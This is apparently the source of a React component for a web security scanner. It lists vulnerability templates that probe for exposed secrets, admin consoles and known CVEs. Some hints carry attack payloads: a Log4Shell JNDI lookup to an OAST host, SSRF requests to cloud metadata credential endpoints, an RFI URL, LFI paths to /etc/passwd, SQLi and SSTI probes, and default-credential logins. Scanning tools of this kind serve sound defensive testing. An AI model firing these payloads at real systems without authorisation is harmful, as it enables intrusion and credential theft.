import { useState, useMemo, useCallback, useRef, useEffect } from 'react';
import { Search, Grid3X3, List, Shield, FileCode2, Play, CheckCircle2, XCircle, Loader2, AlertTriangle, Send, Copy, ExternalLink, Eraser, BookOpen } from 'lucide-react';
import './Templates.css';

interface Probe {
  path: string;
  method?: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH' | 'HEAD' | 'OPTIONS';
  headers?: Record<string, string>;
  body?: string;
  expect: {
    status?: number | number[];
    body_contains?: string[];
    body_contains_any?: string[];
    body_regex?: string;
    body_not_contains?: string[];
    header?: { name: string; pattern?: string };
    missing_header?: string;
    min_body_size?: number;
    not_status?: number[];
  };
}

interface Template {
  id: string;
  name: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  category: string;
  tags: string[];
  description: string;
  probe?: Probe;
  interactive?: boolean;
  hint?: string;
  remediation?: string;
}

interface HttpResponseLike {
  status: number;
  headers: string;
  body: string;
  time_ms: number;
  size: number;
}

interface RunResult {
  status: 'pending' | 'hit' | 'miss' | 'error';
  resp?: HttpResponseLike;
  reason?: string;
  error?: string;
  matched_url?: string;
  finished_at?: number;
}

const TEMPLATES: Template[] = [
  // ── Critical: Exposures ──
  { id: 'git-config', name: 'Git Configuration Exposure', severity: 'critical', category: 'exposures', tags: ['git','config','exposure'], description: 'Detects exposed .git/config files that can leak repository URLs, credentials, and internal paths.', probe: { path: '/.git/config', expect: { status: 200, body_contains_any: ['[core]', '[remote', '[branch'] } }, remediation: 'Block .git/ at the web server level (deny in Apache/Nginx).' },
  { id: 'git-head', name: 'Git HEAD Exposure', severity: 'critical', category: 'exposures', tags: ['git','exposure'], description: 'Detects exposed .git/HEAD file indicating a fully accessible Git repository.', probe: { path: '/.git/HEAD', expect: { status: 200, body_contains: ['ref:'] } } },
  { id: 'git-index', name: 'Git Index Exposure', severity: 'critical', category: 'exposures', tags: ['git','exposure'], description: 'Detects exposed .git/index — full file tree extractable via git-dumper.', probe: { path: '/.git/index', expect: { status: 200, min_body_size: 64 } } },
  { id: 'env-file', name: '.env File Exposure', severity: 'critical', category: 'exposures', tags: ['env','config','exposure'], description: 'Detects exposed .env files containing secrets, API keys, and database credentials.', probe: { path: '/.env', expect: { status: 200, body_contains_any: ['APP_KEY', 'DB_PASSWORD', 'SECRET', 'API_KEY', 'AWS_'], body_not_contains: ['<html', '<!doctype'] } } },
  { id: 'env-prod', name: '.env.production Exposure', severity: 'critical', category: 'exposures', tags: ['env','config','exposure'], description: 'Production environment file exposed.', probe: { path: '/.env.production', expect: { status: 200, body_contains_any: ['APP_KEY', 'DB_PASSWORD', 'SECRET', 'API_KEY'] } } },
  { id: 'env-local', name: '.env.local Exposure', severity: 'critical', category: 'exposures', tags: ['env','config','exposure'], description: 'Local development env file exposed in production.', probe: { path: '/.env.local', expect: { status: 200, body_contains_any: ['APP_KEY', 'DB_PASSWORD', 'SECRET', 'API_KEY'] } } },
  { id: 'docker-compose-exposure', name: 'docker-compose.yml Exposure', severity: 'critical', category: 'exposures', tags: ['docker','exposure'], description: 'Exposed docker-compose.yml leaking service architecture, credentials, and internal network config.', probe: { path: '/docker-compose.yml', expect: { status: 200, body_contains_any: ['services:', 'version:'], body_not_contains: ['<html'] } } },
  { id: 'dockerfile-exposure', name: 'Dockerfile Exposure', severity: 'high', category: 'exposures', tags: ['docker','exposure'], description: 'Exposed Dockerfile leaking build instructions.', probe: { path: '/Dockerfile', expect: { status: 200, body_contains_any: ['FROM ', 'RUN '], body_not_contains: ['<html'] } } },
  { id: 'aws-credentials', name: 'AWS Credentials Exposure', severity: 'critical', category: 'exposures', tags: ['aws','cloud','credentials'], description: 'Detects exposed AWS credential files with access keys.', probe: { path: '/.aws/credentials', expect: { status: 200, body_contains_any: ['aws_access_key_id', 'aws_secret_access_key'] } } },
  { id: 'wp-config-backup', name: 'WordPress Config Backup', severity: 'critical', category: 'exposures', tags: ['wordpress','backup','config'], description: 'Detects backup copies of wp-config.php containing database credentials.', probe: { path: '/wp-config.php.bak', expect: { status: 200, body_contains_any: ['DB_PASSWORD', 'AUTH_KEY', 'wp_'] } } },
  { id: 'wp-config-old', name: 'WordPress wp-config.old', severity: 'critical', category: 'exposures', tags: ['wordpress','backup','config'], description: 'Old wp-config.php backup.', probe: { path: '/wp-config.php.old', expect: { status: 200, body_contains_any: ['DB_PASSWORD', 'AUTH_KEY'] } } },
  { id: 'debug-vars', name: 'Debug Vars Endpoint', severity: 'critical', category: 'exposures', tags: ['debug','exposure'], description: 'Detects exposed Go expvar / debug endpoint leaking environment variables and server internals.', probe: { path: '/debug/vars', expect: { status: 200, body_contains: ['cmdline', 'memstats'] } } },
  { id: 'debug-pprof', name: 'Go pprof Debug Endpoint', severity: 'high', category: 'exposures', tags: ['go','debug','pprof'], description: 'Go pprof debug profiling endpoint exposed.', probe: { path: '/debug/pprof/', expect: { status: 200, body_contains: ['Types of profiles available'] } } },
  { id: 'idea-workspace', name: 'JetBrains IDE Workspace Exposure', severity: 'high', category: 'exposures', tags: ['ide','jetbrains','exposure'], description: 'Exposed .idea/workspace.xml file from JetBrains IDEs.', probe: { path: '/.idea/workspace.xml', expect: { status: 200, body_contains: ['<project'] } } },
  { id: 'vscode-settings', name: 'VS Code Settings Exposure', severity: 'medium', category: 'exposures', tags: ['ide','vscode','exposure'], description: 'Exposed .vscode/settings.json.', probe: { path: '/.vscode/settings.json', expect: { status: 200, body_contains: ['{'], body_not_contains: ['<html'] } } },
  { id: 'svn-entries', name: 'SVN Entries Exposure', severity: 'high', category: 'exposures', tags: ['svn','exposure'], description: 'Exposed .svn/entries file revealing repository structure.', probe: { path: '/.svn/entries', expect: { status: 200 } } },
  { id: 'hg-store', name: 'Mercurial Store Exposure', severity: 'high', category: 'exposures', tags: ['hg','mercurial','exposure'], description: 'Mercurial .hg/store/00manifest.i exposed.', probe: { path: '/.hg/store/00manifest.i', expect: { status: 200 } } },
  { id: 'bzr-config', name: 'Bazaar Config Exposure', severity: 'medium', category: 'exposures', tags: ['bzr','bazaar','exposure'], description: 'Bazaar .bzr/branch/branch.conf exposed.', probe: { path: '/.bzr/branch/branch.conf', expect: { status: 200 } } },
  { id: 'composer-json', name: 'composer.json Exposure', severity: 'medium', category: 'exposures', tags: ['composer','php','exposure'], description: 'PHP Composer manifest exposed (reveals dependencies).', probe: { path: '/composer.json', expect: { status: 200, body_contains_any: ['"require"', '"name"'], body_not_contains: ['<html'] } } },
  { id: 'composer-lock', name: 'composer.lock Exposure', severity: 'medium', category: 'exposures', tags: ['composer','php','exposure'], description: 'PHP Composer lockfile exposed.', probe: { path: '/composer.lock', expect: { status: 200, body_contains: ['"packages"'], body_not_contains: ['<html'] } } },
  { id: 'package-json', name: 'package.json Exposure', severity: 'medium', category: 'exposures', tags: ['node','npm','exposure'], description: 'Node.js package.json manifest exposed.', probe: { path: '/package.json', expect: { status: 200, body_contains: ['"dependencies"'], body_not_contains: ['<html'] } } },
  { id: 'package-lock', name: 'package-lock.json Exposure', severity: 'low', category: 'exposures', tags: ['node','npm','exposure'], description: 'Node.js lockfile exposed.', probe: { path: '/package-lock.json', expect: { status: 200, body_contains: ['"lockfileVersion"'] } } },
  { id: 'yarn-lock', name: 'yarn.lock Exposure', severity: 'low', category: 'exposures', tags: ['node','yarn','exposure'], description: 'Yarn lockfile exposed.', probe: { path: '/yarn.lock', expect: { status: 200, body_contains: ['# yarn lockfile'] } } },
  { id: 'gemfile-lock', name: 'Gemfile.lock Exposure', severity: 'low', category: 'exposures', tags: ['ruby','exposure'], description: 'Ruby Gemfile.lock exposed.', probe: { path: '/Gemfile.lock', expect: { status: 200, body_contains: ['GEM'] } } },
  { id: 'phpinfo', name: 'phpinfo() Disclosure', severity: 'high', category: 'exposures', tags: ['php','info','disclosure'], description: 'Detects exposed phpinfo() pages leaking server configuration.', probe: { path: '/phpinfo.php', expect: { status: 200, body_contains: ['PHP Version'] } } },
  { id: 'phpinfo-info', name: 'phpinfo info.php', severity: 'high', category: 'exposures', tags: ['php','info','disclosure'], description: 'Common info.php phpinfo page.', probe: { path: '/info.php', expect: { status: 200, body_contains: ['PHP Version'] } } },
  { id: 'htaccess-config', name: '.htaccess Config Exposure', severity: 'high', category: 'exposures', tags: ['apache','config','exposure'], description: 'Detects exposed .htaccess files with URL rewrite rules.', probe: { path: '/.htaccess', expect: { status: 200, body_contains_any: ['RewriteEngine', 'RewriteRule', 'AuthType', 'Order '], body_not_contains: ['<html'] } } },
  { id: 'htpasswd', name: '.htpasswd Exposure', severity: 'critical', category: 'exposures', tags: ['apache','htpasswd','credentials'], description: 'Apache .htpasswd file exposed — contains hashed passwords.', probe: { path: '/.htpasswd', expect: { status: 200, body_regex: '^[^:]+:[$A-Za-z0-9./]+', body_not_contains: ['<html'] } } },
  { id: 'ds-store', name: '.DS_Store File Exposure', severity: 'high', category: 'exposures', tags: ['macos','exposure'], description: 'Detects exposed .DS_Store files revealing directory structure.', probe: { path: '/.DS_Store', expect: { status: 200, body_contains: ['Bud1'] } } },
  { id: 'actuator-env', name: 'Spring Boot Actuator /env', severity: 'high', category: 'exposures', tags: ['spring','java','actuator','env'], description: 'Detects exposed Spring Boot Actuator environment endpoint.', probe: { path: '/actuator/env', expect: { status: 200, body_contains_any: ['activeProfiles', 'propertySources'] } } },
  { id: 'actuator-mappings', name: 'Spring Boot Actuator /mappings', severity: 'medium', category: 'exposures', tags: ['spring','java','actuator'], description: 'Detects exposed Actuator mappings endpoint.', probe: { path: '/actuator/mappings', expect: { status: 200, body_contains: ['contexts'] } } },
  { id: 'actuator-heapdump', name: 'Spring Boot /heapdump', severity: 'critical', category: 'exposures', tags: ['spring','java','actuator','heapdump'], description: 'Spring Boot heap dump endpoint exposed — full memory contents downloadable.', probe: { path: '/actuator/heapdump', expect: { status: 200, header: { name: 'content-type', pattern: 'octet-stream' } } } },
  { id: 'actuator-trace', name: 'Spring Boot Actuator /trace', severity: 'high', category: 'exposures', tags: ['spring','java','actuator','trace'], description: 'HTTP request trace history exposed.', probe: { path: '/actuator/httptrace', expect: { status: 200, body_contains_any: ['traces', 'timestamp'] } } },
  { id: 'actuator-health', name: 'Spring Boot Actuator /health', severity: 'info', category: 'exposures', tags: ['spring','java','actuator'], description: 'Detects exposed Spring Boot Actuator health endpoint.', probe: { path: '/actuator/health', expect: { status: 200, body_contains: ['"status"'] } } },
  { id: 'elmah-axd', name: 'ELMAH Error Log Exposure', severity: 'high', category: 'exposures', tags: ['asp.net','error','logs'], description: 'Detects exposed ELMAH error logging interface.', probe: { path: '/elmah.axd', expect: { status: 200, body_contains_any: ['Error Log for', 'ELMAH'] } } },
  { id: 'trace-axd', name: 'ASP.NET Trace Exposure', severity: 'high', category: 'exposures', tags: ['asp.net','trace','debug'], description: 'Detects exposed ASP.NET trace.axd debug page.', probe: { path: '/trace.axd', expect: { status: 200, body_contains: ['Application Trace'] } } },
  { id: 'web-config', name: 'web.config Backup Exposure', severity: 'high', category: 'exposures', tags: ['asp.net','config','backup'], description: 'Detects backup copies of ASP.NET web.config files.', probe: { path: '/web.config.bak', expect: { status: 200, body_contains: ['<configuration'], body_not_contains: ['<html'] } } },
  { id: 'tomcat-default-login', name: 'Apache Tomcat Manager Exposed', severity: 'critical', category: 'default-logins', tags: ['tomcat','java','default-login'], description: 'Tomcat manager interface accessible. Try tomcat:tomcat / admin:admin.', probe: { path: '/manager/html', expect: { status: [200, 401], body_contains_any: ['Tomcat Web Application Manager'] } } },
  { id: 'jenkins-default', name: 'Jenkins Dashboard Exposed', severity: 'critical', category: 'default-logins', tags: ['jenkins','ci','default-login'], description: 'Detects Jenkins instances accessible without authentication.', probe: { path: '/', expect: { status: 200, body_contains: ['Jenkins'], body_not_contains: ['Authentication required'] } } },
  { id: 'jenkins-script', name: 'Jenkins Script Console', severity: 'critical', category: 'default-logins', tags: ['jenkins','ci','rce'], description: 'Jenkins Groovy script console accessible — direct RCE.', probe: { path: '/script', expect: { status: 200, body_contains: ['Script Console'] } } },
  { id: 'elasticsearch-unauthenticated', name: 'Elasticsearch Unauthenticated', severity: 'critical', category: 'default-logins', tags: ['elasticsearch','database','unauthenticated'], description: 'Detects Elasticsearch instances accessible without authentication.', probe: { path: '/_cluster/health', expect: { status: 200, body_contains: ['cluster_name'] } } },
  { id: 'kibana-unauthenticated', name: 'Kibana Unauthenticated Access', severity: 'high', category: 'default-logins', tags: ['kibana','elasticsearch','unauthenticated'], description: 'Detects Kibana instances accessible without authentication.', probe: { path: '/app/kibana', expect: { status: 200, body_contains_any: ['kbn-injected-metadata', 'Kibana'] } } },
  { id: 'mongo-express', name: 'mongo-express Exposed', severity: 'critical', category: 'default-logins', tags: ['mongodb','default-login'], description: 'mongo-express admin UI without auth — full DB access.', probe: { path: '/', expect: { status: 200, body_contains: ['mongo-express'] } } },
  { id: 'redis-commander', name: 'Redis Commander Exposed', severity: 'critical', category: 'default-logins', tags: ['redis','default-login'], description: 'Redis Commander UI exposed.', probe: { path: '/', expect: { status: 200, body_contains: ['Redis Commander'] } } },
  { id: 'grafana-default', name: 'Grafana Default Login', severity: 'high', category: 'default-logins', tags: ['grafana','monitoring','default-login'], description: 'Tests for default Grafana credentials (admin:admin).', probe: { path: '/login', method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"user":"admin","password":"admin"}', expect: { status: 200, body_contains: ['Logged in'] } } },
  { id: 'grafana-detect', name: 'Grafana Login Page', severity: 'info', category: 'technologies', tags: ['grafana','monitoring'], description: 'Detects Grafana login page presence.', probe: { path: '/login', expect: { status: 200, body_contains_any: ['Grafana', 'grafana-app'] } } },
  { id: 'CVE-2024-21887', name: 'Ivanti Connect Secure Auth Bypass', severity: 'critical', category: 'cves', tags: ['ivanti','vpn','auth-bypass','cve2024'], description: 'Detects Ivanti Connect Secure / Pulse Secure VPN. Manual exploitation via /api/v1/totp/user-backup-code/../../license/keys-status/{any}.', interactive: true, hint: 'Send to Repeater and craft the path traversal manually.', probe: { path: '/dana-na/auth/url_default/welcome.cgi', expect: { status: 200, body_contains_any: ['Ivanti', 'Pulse Secure'] } } },
  { id: 'CVE-2023-46747', name: 'F5 BIG-IP Auth Bypass', severity: 'critical', category: 'cves', tags: ['f5','bigip','auth-bypass','cve2023'], description: 'Detects F5 BIG-IP. Manual exploitation via AJP request smuggling on /mgmt/tm/util/bash.', interactive: true, hint: 'F5 BIG-IP detection only; exploit requires AJP smuggling — use Intruder.', probe: { path: '/tmui/login.jsp', expect: { status: 200, body_contains_any: ['BIG-IP', 'f5-logos'] } } },
  { id: 'CVE-2023-22515', name: 'Atlassian Confluence Auth Bypass', severity: 'critical', category: 'cves', tags: ['confluence','atlassian','auth-bypass','cve2023'], description: 'Detects Confluence and tests setup-restore endpoint exposure.', probe: { path: '/setup/setupadministrator.action', expect: { status: 200, body_contains_any: ['setupadministrator', 'Confluence'] } } },
  { id: 'CVE-2023-34362', name: 'MOVEit Transfer Detection', severity: 'critical', category: 'cves', tags: ['moveit','sqli','cve2023'], description: 'Detects MOVEit Transfer (SQLi RCE — manual exploitation required).', interactive: true, hint: 'Detection only; SQLi exploit chain requires Intruder.', probe: { path: '/human.aspx', expect: { status: 200, body_contains_any: ['MOVEit', 'Ipswitch'] } } },
  { id: 'CVE-2024-3400', name: 'Palo Alto PAN-OS Detection', severity: 'critical', category: 'cves', tags: ['paloalto','firewall','rce','cve2024'], description: 'Detects Palo Alto GlobalProtect interface. RCE requires session smuggling.', interactive: true, hint: 'Detection only; chain SSRF + command injection via Intruder.', probe: { path: '/global-protect/login.esp', expect: { status: 200, body_contains_any: ['GlobalProtect', 'paloaltonetworks'] } } },
  { id: 'log4j-rce', name: 'Log4Shell (CVE-2021-44228)', severity: 'critical', category: 'cves', tags: ['log4j','java','rce','cve2021'], description: 'Tests for Log4Shell. Use Scanner active mode with OAST for blind RCE detection.', interactive: true, hint: 'Send {{baseUrl}} to Scanner → Active scan → Enable OAST. JNDI lookup pattern: ${jndi:ldap://OAST_HOST/}', remediation: 'Upgrade Log4j to 2.17.1+ or disable lookups: -Dlog4j2.formatMsgNoLookups=true' },
  { id: 'aws-metadata', name: 'AWS Metadata SSRF Test', severity: 'critical', category: 'vulnerabilities', tags: ['aws','ssrf','cloud','metadata'], description: 'Test for SSRF via AWS EC2 instance metadata. Use a URL param like ?url=http://169.254.169.254/latest/meta-data/', interactive: true, hint: 'Use Intruder with payload http://169.254.169.254/latest/meta-data/iam/security-credentials/ on URL/redirect/path params.' },
  { id: 'gcp-metadata', name: 'GCP Metadata SSRF Test', severity: 'critical', category: 'vulnerabilities', tags: ['gcp','ssrf','cloud','metadata'], description: 'GCP metadata endpoint via SSRF.', interactive: true, hint: 'Payload: http://metadata.google.internal/computeMetadata/v1/?recursive=true with header Metadata-Flavor: Google' },
  { id: 'azure-metadata', name: 'Azure Metadata SSRF Test', severity: 'critical', category: 'vulnerabilities', tags: ['azure','ssrf','cloud','metadata'], description: 'Azure IMDS via SSRF.', interactive: true, hint: 'Payload: http://169.254.169.254/metadata/instance?api-version=2021-02-01 with header Metadata: true' },
  { id: 'rfi-test', name: 'Remote File Inclusion Test', severity: 'critical', category: 'fuzzing', tags: ['rfi','injection'], description: 'Tests for Remote File Inclusion by injecting external URL into vulnerable params.', interactive: true, hint: 'Use Intruder with payload http://OAST_HOST/rfi.txt on file/page/include/template params.' },

  // ── High ──
  { id: 'cors-reflection', name: 'CORS Origin Reflection', severity: 'high', category: 'misconfiguration', tags: ['cors','headers','security'], description: 'Detects CORS that reflects the Origin header without validation.', probe: { path: '/', method: 'GET', headers: { Origin: 'https://attacker.example' }, expect: { header: { name: 'access-control-allow-origin', pattern: 'attacker.example' } } } },
  { id: 'cors-null-origin', name: 'CORS Null Origin Accepted', severity: 'high', category: 'misconfiguration', tags: ['cors','headers'], description: 'Server reflects Origin: null which allows attacks from sandboxed iframes.', probe: { path: '/', headers: { Origin: 'null' }, expect: { header: { name: 'access-control-allow-origin', pattern: '^null$' } } } },
  { id: 'cname-s3-takeover', name: 'AWS S3 Subdomain Takeover', severity: 'high', category: 'takeovers', tags: ['aws','s3','takeover'], description: 'Dangling CNAME pointing to an unclaimed AWS S3 bucket.', probe: { path: '/', expect: { body_contains_any: ['NoSuchBucket', 'The specified bucket does not exist'] } } },
  { id: 'cname-github-takeover', name: 'GitHub Pages Takeover', severity: 'high', category: 'takeovers', tags: ['github','takeover'], description: 'Dangling CNAME pointing to unclaimed GitHub Pages.', probe: { path: '/', expect: { status: 404, body_contains: ["There isn't a GitHub Pages site here"] } } },
  { id: 'cname-heroku-takeover', name: 'Heroku Subdomain Takeover', severity: 'high', category: 'takeovers', tags: ['heroku','takeover'], description: 'Dangling CNAME pointing to unclaimed Heroku app.', probe: { path: '/', expect: { body_contains: ['No such app'] } } },
  { id: 'cname-azure-takeover', name: 'Azure Subdomain Takeover', severity: 'high', category: 'takeovers', tags: ['azure','takeover'], description: 'Dangling CNAME pointing to unclaimed Azure resource.', probe: { path: '/', expect: { body_contains_any: ['404 Web Site not found', 'Our services aren\'t available'] } } },
  { id: 'cname-fastly-takeover', name: 'Fastly Subdomain Takeover', severity: 'high', category: 'takeovers', tags: ['fastly','takeover'], description: 'Dangling CNAME pointing to unclaimed Fastly service.', probe: { path: '/', expect: { body_contains: ['Fastly error: unknown domain'] } } },
  { id: 'cname-shopify-takeover', name: 'Shopify Subdomain Takeover', severity: 'high', category: 'takeovers', tags: ['shopify','takeover'], description: 'Dangling CNAME pointing to unclaimed Shopify store.', probe: { path: '/', expect: { body_contains_any: ['Sorry, this shop is currently unavailable', 'Only one step left!'] } } },
  { id: 'cname-readme-takeover', name: 'Readme.io Subdomain Takeover', severity: 'high', category: 'takeovers', tags: ['readme','takeover'], description: 'Dangling CNAME on Readme.io.', probe: { path: '/', expect: { body_contains: ['Project doesnt exist'] } } },
  { id: 'firebase-db-open', name: 'Firebase Database Open Access', severity: 'high', category: 'misconfiguration', tags: ['firebase','google','database'], description: 'Detects openly accessible Firebase Realtime Database.', probe: { path: '/.json', expect: { status: 200, body_not_contains: ['Permission denied'] } } },
  { id: 'CVE-2023-44487', name: 'HTTP/2 Rapid Reset DoS', severity: 'high', category: 'cves', tags: ['http2','dos','cve2023'], description: 'Detects HTTP/2 capability — Rapid Reset DoS requires custom client.', interactive: true, hint: 'Detection only; DoS exploit requires custom HTTP/2 client.' },
  { id: 'lfi-etc-passwd', name: 'LFI /etc/passwd', severity: 'high', category: 'fuzzing', tags: ['lfi','path-traversal','linux'], description: 'Tests for Local File Inclusion vulnerability.', interactive: true, hint: 'Use Intruder with payload ../../../../etc/passwd on file/page/include/template params. Check response for root:x:0:0.' },
  { id: 'lfi-windows-hosts', name: 'LFI Windows Hosts', severity: 'high', category: 'fuzzing', tags: ['lfi','path-traversal','windows'], description: 'Tests for Local File Inclusion on Windows.', interactive: true, hint: 'Use Intruder with payload ..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' },
  { id: 'sqli-error-mysql', name: 'SQL Injection Error (MySQL)', severity: 'high', category: 'fuzzing', tags: ['sqli','mysql','injection'], description: 'Tests for error-based SQL injection via MySQL errors.', interactive: true, hint: "Use Intruder with payload \"'\" — look for \"You have an error in your SQL syntax\" in response." },
  { id: 'sqli-error-postgres', name: 'SQL Injection Error (PostgreSQL)', severity: 'high', category: 'fuzzing', tags: ['sqli','postgres','injection'], description: 'Tests for error-based SQL injection via PostgreSQL errors.', interactive: true, hint: 'Use Intruder; look for "PostgreSQL query failed" / "unterminated quoted string"' },
  { id: 'sqli-error-mssql', name: 'SQL Injection Error (MSSQL)', severity: 'high', category: 'fuzzing', tags: ['sqli','mssql','injection'], description: 'Tests for error-based SQL injection via MS SQL errors.', interactive: true, hint: 'Look for "Microsoft SQL Server" / "Unclosed quotation mark" in response.' },
  { id: 'sqli-error-oracle', name: 'SQL Injection Error (Oracle)', severity: 'high', category: 'fuzzing', tags: ['sqli','oracle','injection'], description: 'Oracle error-based SQLi.', interactive: true, hint: 'Look for ORA- error codes in response.' },
  { id: 'ssti-basic', name: 'Server-Side Template Injection', severity: 'high', category: 'fuzzing', tags: ['ssti','injection','template'], description: 'Tests for SSTI by injecting a mathematical expression.', interactive: true, hint: 'Use Intruder with payload {{7*7}} or ${7*7} or <%= 7*7 %> — look for 49 in response.' },
  { id: 'xxe-basic', name: 'XXE Injection Test', severity: 'high', category: 'fuzzing', tags: ['xxe','xml','injection'], description: 'Tests for XML External Entity injection.', interactive: true, hint: 'Use Repeater. Send POST with Content-Type: application/xml and XXE payload defining external entity.' },
  { id: 'graphql-introspection', name: 'GraphQL Introspection Enabled', severity: 'medium', category: 'misconfiguration', tags: ['graphql','api','introspection'], description: 'GraphQL introspection query allowed — full schema disclosure.', probe: { path: '/graphql', method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"query":"{__schema{types{name}}}"}', expect: { status: 200, body_contains: ['__schema'] } } },
  { id: 'graphql-batching', name: 'GraphQL Batch Query Allowed', severity: 'medium', category: 'misconfiguration', tags: ['graphql','api','batching'], description: 'GraphQL allows batched queries — used to bypass rate limiting.', probe: { path: '/graphql', method: 'POST', headers: { 'content-type': 'application/json' }, body: '[{"query":"{__typename}"},{"query":"{__typename}"}]', expect: { status: 200, body_contains: ['__typename'] } } },
  { id: 'wp-debug-log', name: 'WordPress debug.log Exposure', severity: 'high', category: 'exposures', tags: ['wordpress','debug','log'], description: 'WordPress debug.log file exposed.', probe: { path: '/wp-content/debug.log', expect: { status: 200, body_contains_any: ['PHP Warning', 'PHP Notice', 'PHP Error', 'Stack trace'] } } },
  { id: 'laravel-debug', name: 'Laravel Debug Mode (Ignition)', severity: 'critical', category: 'misconfiguration', tags: ['laravel','php','debug'], description: 'Laravel Ignition debug page leaks env + stack traces. May enable CVE-2021-3129 RCE.', probe: { path: '/__not__exists__page__', expect: { status: 500, body_contains_any: ['Ignition', 'whoops_exception'] } } },
  { id: 'symfony-debug', name: 'Symfony Profiler Exposed', severity: 'high', category: 'misconfiguration', tags: ['symfony','php','debug'], description: 'Symfony web profiler/debug toolbar exposed.', probe: { path: '/_profiler', expect: { status: 200, body_contains: ['Symfony Profiler'] } } },
  { id: 'wp-users-enum', name: 'WordPress Users Enumeration (WP-JSON)', severity: 'medium', category: 'misconfiguration', tags: ['wordpress','enum','users'], description: 'Enumerate WordPress users via REST API.', probe: { path: '/wp-json/wp/v2/users', expect: { status: 200, body_contains: ['"slug":'] } } },
  { id: 'wp-config-readable', name: 'WordPress wp-config.txt', severity: 'critical', category: 'exposures', tags: ['wordpress','config'], description: 'wp-config copied as .txt — credentials readable.', probe: { path: '/wp-config.txt', expect: { status: 200, body_contains_any: ['DB_PASSWORD', 'DB_NAME'] } } },
  { id: 'jboss-jmx-console', name: 'JBoss JMX Console Exposed', severity: 'critical', category: 'default-logins', tags: ['jboss','jmx','default-login'], description: 'JBoss /jmx-console accessible — deploy WAR for RCE.', probe: { path: '/jmx-console/', expect: { status: 200, body_contains: ['JMX Agent'] } } },
  { id: 'weblogic-console', name: 'Oracle WebLogic Console Exposed', severity: 'high', category: 'default-logins', tags: ['weblogic','oracle','default-login'], description: 'WebLogic admin console exposed.', probe: { path: '/console/login/LoginForm.jsp', expect: { status: 200, body_contains: ['Oracle WebLogic'] } } },
  { id: 'glassfish-console', name: 'GlassFish Admin Console', severity: 'high', category: 'default-logins', tags: ['glassfish','java','default-login'], description: 'GlassFish admin console exposed (try admin:admin).', probe: { path: '/common/index.jsf', expect: { status: 200, body_contains: ['GlassFish'] } } },
  { id: 'docker-api', name: 'Docker Engine API Exposed', severity: 'critical', category: 'default-logins', tags: ['docker','api','rce'], description: 'Docker remote API exposed — full host RCE.', probe: { path: '/version', expect: { status: 200, body_contains: ['ApiVersion'] } } },
  { id: 'k8s-apiserver', name: 'Kubernetes API Server Anon', severity: 'critical', category: 'default-logins', tags: ['kubernetes','k8s','api'], description: 'Kubernetes API server allows anonymous access.', probe: { path: '/api/v1/namespaces', expect: { status: 200, body_contains: ['"kind":"NamespaceList"'] } } },
  { id: 'k8s-kubelet', name: 'Kubernetes Kubelet API', severity: 'critical', category: 'default-logins', tags: ['kubernetes','kubelet','rce'], description: 'Kubelet read-only API exposed — pod info + exec on read-write port.', probe: { path: '/pods', expect: { status: 200, body_contains: ['"kind":"PodList"'] } } },
  { id: 'consul-api', name: 'Consul HTTP API', severity: 'high', category: 'default-logins', tags: ['consul','hashicorp','api'], description: 'HashiCorp Consul API exposed without ACL.', probe: { path: '/v1/agent/self', expect: { status: 200, body_contains: ['Config'] } } },
  { id: 'nomad-api', name: 'Nomad HTTP API', severity: 'high', category: 'default-logins', tags: ['nomad','hashicorp','api'], description: 'HashiCorp Nomad API exposed.', probe: { path: '/v1/agent/self', expect: { status: 200, body_contains_any: ['member', 'NomadVersion'] } } },
  { id: 'vault-api', name: 'Vault Status Disclosure', severity: 'info', category: 'technologies', tags: ['vault','hashicorp','api'], description: 'HashiCorp Vault status endpoint exposed.', probe: { path: '/v1/sys/health', expect: { status: [200, 429, 472, 473, 501, 503], body_contains: ['version'] } } },
  { id: 'prometheus-metrics', name: 'Prometheus Metrics Exposed', severity: 'medium', category: 'exposures', tags: ['prometheus','metrics'], description: 'Unauthenticated Prometheus /metrics endpoint.', probe: { path: '/metrics', expect: { status: 200, body_contains_any: ['# HELP', '# TYPE'] } } },
  { id: 'prometheus-targets', name: 'Prometheus Targets Exposed', severity: 'medium', category: 'exposures', tags: ['prometheus','monitoring'], description: 'Prometheus /api/v1/targets exposed — leaks internal service map.', probe: { path: '/api/v1/targets', expect: { status: 200, body_contains: ['discoveredLabels'] } } },
  { id: 'sonarqube-default', name: 'SonarQube Default Login', severity: 'high', category: 'default-logins', tags: ['sonarqube','default-login'], description: 'SonarQube detected (try admin:admin).', probe: { path: '/sessions/new', expect: { status: 200, body_contains: ['SonarQube'] } } },
  { id: 'gitlab-detect', name: 'GitLab Instance Detection', severity: 'info', category: 'technologies', tags: ['gitlab','git'], description: 'GitLab instance detected.', probe: { path: '/users/sign_in', expect: { status: 200, body_contains: ['GitLab'] } } },
  { id: 'gitea-detect', name: 'Gitea Instance Detection', severity: 'info', category: 'technologies', tags: ['gitea','git'], description: 'Gitea instance detected.', probe: { path: '/', expect: { body_contains: ['Powered by Gitea'] } } },
  { id: 'rabbitmq-mgmt', name: 'RabbitMQ Management Exposed', severity: 'high', category: 'default-logins', tags: ['rabbitmq','default-login'], description: 'RabbitMQ management UI (try guest:guest).', probe: { path: '/api/overview', expect: { status: [200, 401] } } },

  // ── Medium ──
  { id: 'swagger-ui', name: 'Swagger UI Exposure', severity: 'medium', category: 'exposures', tags: ['api','swagger','documentation'], description: 'Detects exposed Swagger/OpenAPI documentation.', probe: { path: '/swagger-ui.html', expect: { status: 200, body_contains_any: ['swagger-ui', 'Swagger UI'] } } },
  { id: 'swagger-ui-v3', name: 'Swagger UI v3 Exposure', severity: 'medium', category: 'exposures', tags: ['api','swagger','documentation'], description: 'Swagger UI v3 location.', probe: { path: '/swagger-ui/index.html', expect: { status: 200, body_contains_any: ['swagger-ui', 'Swagger UI'] } } },
  { id: 'swagger-json', name: 'Swagger JSON Spec', severity: 'medium', category: 'exposures', tags: ['api','swagger','documentation'], description: 'Detects exposed Swagger/OpenAPI JSON specification.', probe: { path: '/v2/api-docs', expect: { status: 200, body_contains_any: ['"swagger"', '"openapi"'] } } },
  { id: 'openapi-yaml', name: 'OpenAPI YAML Exposure', severity: 'medium', category: 'exposures', tags: ['api','openapi','documentation'], description: 'Detects exposed OpenAPI YAML specification files.', probe: { path: '/openapi.yaml', expect: { status: 200, body_contains: ['openapi:'] } } },
